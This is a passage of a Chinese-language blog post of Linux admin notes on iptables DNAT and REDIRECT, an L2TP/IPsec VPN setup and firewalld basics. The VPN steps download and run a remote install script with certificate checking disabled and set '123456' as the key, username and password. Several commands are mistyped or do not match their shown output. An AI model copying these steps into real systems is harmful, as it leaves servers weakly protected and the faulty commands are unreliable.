172.16.0.135---&gt;nginx服务<br><span class="hljs-built_in">tail</span> -f /var/log/nginx/access.log<br>172.16.0.10 - - [01/Aug/2022:13:56:24 +0000] <span class="hljs-string">&quot;GET / HTTP/1.1&quot;</span> 200 612 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;curl/7.29.0&quot;</span><br><br><span class="hljs-comment">##curl一个大一点的文件，查看ubuntu端的tcp连接状态(ESTABLISHED)，ss -nt，peer查看远端的地址</span><br>State              Recv-Q           Send-Q           Local Address:Port          Peer   <br>ESTAB              0                1152608          172.16.0.135:80             172.16.0.10:53704<br>curl 172.16.0.135/test.txt<br></code></pre></td></tr></table></figure>
+
+<h2 id="iptables实现DNAT-外访问内"><a href="#iptables实现DNAT-外访问内" class="headerlink" title="iptables实现DNAT(外访问内)"></a>iptables实现DNAT(外访问内)</h2><p>访问到iptables默认的出公网地址(NAT网关的IP)，由这个地址转发到内部的请求，访问内部的应用+端口号；DNAT规则就是默认的IP了，不会有动态IP的情况，一般的NAT网关/SLB的IP都为固定</p>
+<p>从PREROUTING进去，目的IP为iptables的公网网卡</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##源-s：源端IP，-d：网关的IP，--to-destination：interserver(内网目标机器的IP)</span><br>iptables -t nat -I PREROUTING -s 172.16.0.135 -d 172.16.0.10 -p tcp --dport 80 -j DNAT --to-destination 10.0.0.130:8080<br><br><span class="hljs-comment">##直接DNAT可以</span><br><br><span class="hljs-comment">##查看</span><br>ipnum -t nat<br>Chain PREROUTING (policy ACCEPT)<br>num  target     prot opt <span class="hljs-built_in">source</span>               destination         <br>1    DNAT       tcp  --  172.16.0.135         172.16.0.10          tcp dpt:80 to:10.0.0.130:80<br><br><span class="hljs-comment">##测试，从ubuntu机器(172.16.0.135)访问，无论是curl还是telnet都是通的，证明DNAT成功</span><br><span class="hljs-comment">##目标端10.0.0.130的http服务修改了port为8080</span><br>curl 172.16.0.10<br>curl 172.16.0.10<br>http <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="iptables实现重定向REDIRECT-有点问题，不如直接DNAT"><a href="#iptables实现重定向REDIRECT-有点问题，不如直接DNAT" class="headerlink" title="iptables实现重定向REDIRECT(有点问题，不如直接DNAT)"></a>iptables实现重定向REDIRECT(有点问题，不如直接DNAT)</h2><p>同样也是在PREROUTING上面写，通过NAT网关的IP:80转发到后端的8080端口，类似SLB的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##-d目的地址，--dport：NAT网关上面的地址，--to-ports：目标地址的业务端口，从80转发到8080</span><br>iptables -t nat -I PREROUTING  -s 172.16.0.135 -d 172.16.0.10 -p tcp --dport 80 -j REDIRECT --to-ports 8080<br><br><span class="hljs-comment">##重定向转发貌似不是很行</span><br><br><span class="hljs-comment">##测试，能否转发到8080端口</span><br>curl 172.16.0.10 80<br>telnet 172.16.0.10 80<br></code></pre></td></tr></table></figure>
+
+<h1 id="综合案例"><a href="#综合案例" class="headerlink" title="综合案例"></a>综合案例</h1><p><img src="2792175-20220828181118478-1291676721.png" srcset="/img/loading.gif" lazyload alt="image-20220803212953176"></p>
+<h1 id="iptables实现VPN搭建-周末可以研究这个脚本"><a href="#iptables实现VPN搭建-周末可以研究这个脚本" class="headerlink" title="iptables实现VPN搭建(周末可以研究这个脚本)"></a>iptables实现VPN搭建(周末可以研究这个脚本)</h1><p><strong>Cent OS搭建l2tp</strong></p>
+<p>方案一：通过获取现成L2PT脚本搭建</p>
+<p>1、拉取脚本</p>
+<p>wget –no-check-certificate <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/teddysun/across/master/l2tp.sh">https://raw.githubusercontent.com/teddysun/across/master/l2tp.sh</a></p>
+<p>2、更改权限</p>
+<p>chmod +x l2tp.sh</p>
+<p>3、跑脚本</p>
+<p>./l2tp.sh</p>
+<p>wget –no-check-certificate <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/teddysun/across/master/l2tp.sh">https://raw.githubusercontent.com/teddysun/across/master/l2tp.sh</a></p>
+<p>4、显示Please enter IP-Range</p>
+<p>输入：10.0.10 .0 （表示分给客户端的IP段）</p>
+<p>5、显示Please enter PSK</p>
+<p>输入：123456 （自定义PSK，随便英文数字都可）</p>
+<p>6、显示Please enter Username</p>
+<p>输入：123456 （自定义用户名）</p>
+<p>7、显示Please enter 123456’s password</p>
+<p>输入：123456 （自定义密码）</p>
+<p>8、后面一直enter即可，成功后会返回主要信息。</p>
+<p>注意点：如果WIN10客户端连接不上，需要更改注册表</p>
+<p>打开regedit</p>
+<p>找到HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Rasman\Parameters</p>
+<p>新建 Value Name: ProhibitIpSec</p>
+<p> Data Type: REG_DWORD</p>
+<p> Value: 1</p>
+<p>备注：</p>
+<p>如果你要想对用户进行操作，可以使用如下命令：</p>
+<p>l2tp -a 新增用户</p>
+<p>l2tp -d 删除用户</p>
+<p>l2tp -m 修改现有的用户的密码</p>
+<p>l2tp -l 列出所有用户名和密码</p>
+<p>l2tp -h 列出帮助信息</p>
+<p>其他事项：</p>
+<p>1、脚本在安装完成后，已自动启动进程，并加入了开机自启动。</p>
+<p>2、脚本会改写 iptables 或 firewalld 的规则。</p>
+<p>3、脚本安装时，会即时将安装日志写到 /root/l2tp.log 文件里，如果你安装失败，可以通过此文件来寻找错误信息。</p>
+<p>使用命令：</p>
+<p>ipsec status （查看 IPSec 运行状态）</p>
+<p>ipsec verify （查看 IPSec 检查结果）</p>
+<p>/etc/init.d/ipsec start|stop|restart|status （CentOS6 下使用）</p>
+<p>/etc/init.d/xl2tpd start|stop|restart （CentOS6 下使用）</p>
+<p>systemctl start|stop|restart|status ipsec （CentOS7 下使用）</p>
+<p>systemctl start|stop|restart xl2tpd （CentOS7 下使用）</p>
+<p>service ipsec start|stop|restart|status （Debian/Ubuntu 下使用）</p>
+<p>service xl2tpd start|stop|restart （Debian/Ubuntu 下使用）</p>
+<p>方案二：自建L2PT</p>
+<p>1.安装 l2tp ipsec 所需要的软件包</p>
+<p>yum install epel-release</p>
+<p>yum install openswan xl2tpd ppp lsof</p>
+<p>2.设置ipsec</p>
+<p>2.1 编辑 /etc/ipsec.conf</p>
+<p>vi /etc/ipsec.conf</p>
+<p>把下面xx.xxx.xxx.xxx换成你自己主机实际的外网固定IP。其他的不动。</p>
+<p>config setup</p>
+<p>protostack=netkey</p>
+<p>dumpdir=/var/run/pluto/</p>
+<p>nat_traversal=yes</p>
+<p>virtual_private=%v4:10.0.0.0/8,%v4:192.168.0.0/16,%v4:172.16.0.0/12,%v4:25.0.0.0/8,%v4:100.64.0.0/10,%v6:fd00::/8,%v6:fe80::/10</p>
+<p>conn L2TP-PSK-NAT</p>
+<p>rightsubnet=vhost:%priv</p>
+<p>also=L2TP-PSK-noNAT</p>
+<p>conn L2TP-PSK-noNAT</p>
+<p>authby=secret</p>
+<p>pfs=no</p>
+<p>auto=add</p>
+<p>keyingtries=3</p>
+<p>dpddelay=30</p>
+<p>dpdtimeout=120</p>
+<p>dpdaction=clear</p>
+<p>rekey=no</p>
+<p>ikelifetime=8h</p>
+<p>keylife=1h</p>
+<p>type=transport</p>
+<p>left=xxx.xxx.xxx.xxx</p>
+<p>leftprotoport=17/1701</p>
+<p>right=%any</p>
+<p>rightprotoport=17/%any</p>
+<p>2.2 编辑/etc/ipsec.secrets</p>
+<p>vi /etc/ipsec.secrets</p>
+<p>include /etc/ipsec.d/default.secrets</p>
+<p>/etc/ipsec.secrets 文件里面默认有一句包含</p>
+<p>/etc/ipsec.d/*.secrets</p>
+<p>的语句.所以可以直接在 /etc/ipsec.d 目录下新建一自己的个 default.secrets 文件.也可以直接把它注释掉,添加下面的配置语句.</p>
+<p>vi /etc/ipsec.d/my.secrets</p>
+<p>xxx.xxx.xxx.xxx %any: PSK “kuaile”</p>
+<p>xx.xxx.xxx.xxx换成你自己VPS实际的外网固定IP, YourPsk你自己定一个，到时候连VPN的时候用，比如可以填csdn.net, 注意空格。</p>
+<p>2.3 修改/添加 /etc/sysctl.conf</p>
+<p>vi /etc/sysctl.conf</p>
+<p>确保下面的字段都有，对应的值或下面一样。省事的话直接在/etc/sysctl.conf的末尾直接把下面内容的粘过去。</p>
+<p>net.ipv4.ip_forward = 1</p>
+<p>net.ipv4.conf.default.accept_redirects = 0</p>
+<p>net.ipv4.conf.default.send_redirects = 0</p>
+<p>net.ipv4.conf.eth0.rp_filter = 0</p>
+<p>net.ipv4.conf.default.rp_filter = 0</p>
+<p>2.4 让修改后的sysctl.conf生效</p>
+<p>sysctl -p</p>
+<p>2.5 验证ipsec运行状态</p>
+<p>ipsec setup start</p>
+<p>ipsec verify</p>
+<p>verify的内容如下所示，那么就离成功不远了。没有 红色 的fail 就可以了.</p>
+<p>Verifying installed system and configuration files</p>
+<p>Version check and ipsec on-path [OK]</p>
+<p>Libreswan 3.15 (netkey) on 3.10.0-123.9.3.el7.x86_64</p>
+<p>Checking for IPsec support in kernel [OK]</p>
+<p>NETKEY: Testing XFRM related proc values</p>
+<p> ICMP default/send_redirects [OK]</p>
+<p> ICMP default/accept_redirects [OK]</p>
+<p> XFRM larval drop [OK]</p>
+<p>Pluto ipsec.conf syntax [OK]</p>
+<p>Hardware random device [N/A]</p>
+<p>Two or more interfaces found, checking IP forwarding [OK]</p>
+<p>Checking rp_filter [OK]</p>
+<p>Checking that pluto is running [OK]</p>
+<p>Pluto listening for IKE on udp 500 [OK]</p>
+<p>Pluto listening for IKE/NAT-T on udp 4500 [OK]</p>
+<p>Pluto ipsec.secret syntax [OK]</p>
+<p>Checking ‘ip’ command [OK]</p>
+<p>Checking ‘iptables’ command [OK]</p>
+<p>Checking ‘prelink’ command does not interfere with FIPSChecking for obsolete ipsec.conf options [OK]</p>
+<p>Opportunistic Encryption [DISABLED]</p>
+<p>\3. 设置 l2tp</p>
+<p>3.1 编辑 /etc/xl2tpd/xl2tpd.conf</p>
+<p>vim /etc/xl2tpd/xl2tpd.conf</p>
+<p>[global]</p>
+<p>ipsec saref = yes</p>
+<p>listen-addr = xxx.xxx.xxx.xxx ;这里是你的主机外网ip地址,;号是注释,和一般的配置文件不同</p>
+<p>; Use refinfo of 22 if using an SAref kernel patch based on openswan 2.6.35 or</p>
+<p>; when using any of the SAref kernel patches for kernels up to 2.6.35.</p>
+<p>; saref refinfo = 30</p>
+<p>;</p>
+<p>force userspace = yes</p>
+<p>;</p>
+<p>; debug tunnel = yes</p>
+<p>[lns default]</p>
+<p>ip range = 10.0.10.2-10.0.10.100 ;这里是VPN client的内网ip地址范围</p>
+<p>local ip = 10.0.10.1 ;这里是VPN server的内网地址</p>
+<p>refuse chap = yes</p>
+<p>refuse pap = yes</p>
+<p>require authentication = yes</p>
+<p>name = LinuxVPNserver</p>
+<p>ppp debug = yes</p>
+<p>pppoptfile = /etc/ppp/options.xl2tpd</p>
+<p>length bit = yes</p>
+<p>3.2 编辑 /etc/ppp/options.xl2tpd</p>
+<p>vi /etc/ppp/options.xl2tpd</p>
+<p>name l2tpd</p>
+<p>require-mschap-v2</p>
+<p>ms-dns 180.76.76.76</p>
+<p>ms-dns 223.5.5.5</p>
+<p>ms-dns 8.8.8.8</p>
+<p>ipcp-accept-local</p>
+<p>ipcp-accept-remote</p>
+<p>#ms-dns 8.8.8.8</p>
+<p>noccp</p>
+<p>auth</p>
+<p>crtscts</p>
+<p>idle 1800</p>
+<p>mtu 1410</p>
+<p>mru 1410</p>
+<p>nodefaultroute</p>
+<p>debug</p>
+<p>lock</p>
+<p>proxyarp</p>
+<p>connect-delay 5000</p>
+<p>3.3 配置用户名,密码:编辑 /etc/ppp/chap-secrets</p>
+<p>vim /etc/ppp/chap-secrets</p>
+<p>client和secret自己填，server和IP留号，l2tp 可以用上面自己设定的 l2tpd . 通用</p>
+<p># Secrets for authentication using CHAP</p>
+<p># client server secret IP addresses</p>
+<p>ison * 123456 *</p>
+<p>3.4 启动xl2tp</p>
+<p>service xl2tpd start</p>
+<p>\4. 开放端口以及转发</p>
+<p>原样执行下面所有命令</p>
+<p>/sbin/iptables -A INPUT -p udp -m policy –dir in –pol ipsec -m udp –dport 1701 -j ACCEPT</p>
+<p>/sbin/iptables -A INPUT -p udp -m udp –dport 1701 -j ACCEPT</p>
+<p>/sbin/iptables -A INPUT -p udp -m udp –dport 500 -j ACCEPT</p>
+<p>/sbin/iptables -A INPUT -p udp -m udp –dport 4500 -j ACCEPT</p>
+<p>/sbin/iptables -A INPUT -p esp -j ACCEPT</p>
+<p>/sbin/iptables -A INPUT -m policy –dir in –pol ipsec -j ACCEPT</p>
+<p>/sbin/iptables -A FORWARD -d 10.0.10.0/24 -j ACCEPT</p>
+<p>/sbin/iptables -A FORWARD -s 10.0.10.0/24 -j ACCEPT</p>
+<p>/sbin/iptables -A FORWARD -i ppp+ -m state –state NEW,RELATED,ESTABLISHED -j ACCEPT</p>
+<p>/sbin/iptables -A FORWARD -m state –state RELATED,ESTABLISHED -j ACCEPT</p>
+<p>/sbin/iptables -t nat -A POSTROUTING -s 10.0.10.0/24 -o eth0 -j MASQUERADE</p>
+<p>再执行下面保存iptables</p>
+<p>service iptables save</p>
+<p>service iptables restart</p>
+<p>添加开机自启动</p>
+<p>systemd enabled ipsec</p>
+<p>systemd enabled xl2tpd</p>
+<p>如果连接不上的话, 先关掉iptalbes试试 service iptables stop</p>
+<p>如果这时还连不上了，那么就是iptables的问题了</p>
+<p>特别注意iptables里的顺序， INPUT和FORWARD里的REJECT一定是写在最后面，否则写在他们之后的port就都被REJECT了！</p>
+<p>下面是我自己的iptables，可供参考</p>
+<p>#############</p>
+<p>*nat</p>
+<p>:PREROUTING ACCEPT [3:160]</p>
+<p>:INPUT ACCEPT [3:160]</p>
+<p>:OUTPUT ACCEPT [3:180]</p>
+<p>:POSTROUTING ACCEPT [3:180]</p>
+<p>-A POSTROUTING -s 10.0.10.0/24 -o eth0 -j MASQUERADE</p>
+<p>COMMIT</p>
+<p># Completed on Sat Mar 18 22:21:34 2017</p>
+<p># Generated by iptables-save v1.4.21 on Sat Mar 18 22:21:34 2017</p>
+<p>*filter</p>
+<p>:INPUT ACCEPT [237:33515]</p>
+<p>:FORWARD ACCEPT [0:0]</p>
+<p>:OUTPUT ACCEPT [162:45870]</p>
+<p>-A INPUT -m state –state ESTABLISHED,RELATED -j ACCEPT</p>
+<p>-A INPUT -p icmp -j ACCEPT</p>
+<p>-A INPUT -i lo -j ACCEPT</p>
+<p>-A INPUT -m state –state NEW -m tcp -p tcp –dport 80 -j ACCEPT</p>
+<p>-A INPUT -m state –state NEW -m tcp -p tcp –dport 443 -j ACCEPT</p>
+<p>-A INPUT -m state –state NEW -m tcp -p tcp –dport 22 -j ACCEPT</p>
+<p>-A INPUT -p udp -m policy –dir in –pol ipsec -m udp –dport 1701 -j ACCEPT</p>
+<p>-A INPUT -p udp -m udp –dport 1701 -j ACCEPT</p>
+<p>-A INPUT -p udp -m udp –dport 500 -j ACCEPT</p>
+<p>-A INPUT -p udp -m udp –dport 4500 -j ACCEPT</p>
+<p>-A INPUT -p esp -j ACCEPT</p>
+<p>-A INPUT -m policy –dir in –pol ipsec -j ACCEPT</p>
+<p>-A FORWARD -d 10.0.10.0/24 -j ACCEPT</p>
+<p>-A FORWARD -s 10.0.10.0/24 -j ACCEPT</p>
+<p>-A FORWARD -i ppp+ -m state –state NEW,RELATED,ESTABLISHED -j ACCEPT</p>
+<p>-A FORWARD -m state –state RELATED,ESTABLISHED -j ACCEPT</p>
+<p>-A INPUT -j REJECT –reject-with icmp-host-prohibited</p>
+<p>-A FORWARD -j REJECT –reject-with icmp-host-prohibited</p>
+<p>COMMIT</p>
+<p># Completed on Sat Mar 18 22:21:34 2017</p>
+<h1 id="firewalld防火墙工具"><a href="#firewalld防火墙工具" class="headerlink" title="firewalld防火墙工具"></a>firewalld防火墙工具</h1><p>分为命令行工具和图形化工具</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##基本命令行工具</span><br>firewall-cmd<br>firewall-cmd --add-port=80/tcp<br>firewall-cmd --add-port=8080/tcp <span class="hljs-comment">##添加8080端口的访问</span><br><br>firewall-cmd --reload <span class="hljs-comment">##重新加载新规则以生效</span><br><br>firewall --list-services <span class="hljs-comment">##列出服务</span><br>firewall --add-service=http <span class="hljs-comment">##添加http服务</span><br></code></pre></td></tr></table></figure>
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/07/28/linux%E6%97%A5%E5%BF%97%E6%9C%8D%E5%8A%A1/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">linux日志服务</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/07/28/%E7%AC%AC%E5%85%AB%E5%91%A8/">
+                        <span class="hidden-mobile">第八周</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://qm.qq.com/cgi-bin/qm/qr?k=A5I1aDMT5p5nmi3zDa8t7gWOHawJhjyi&noverify=0&personal_qrcode_source=4" target="_blank" rel="nofollow noopener"><span>JohnBakcu</span></a> <i class="iconfont icon-love"></i> <a href="https://www.magedu.com"  target="_blank" rel="nofollow noopener"><span>Mgedu</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
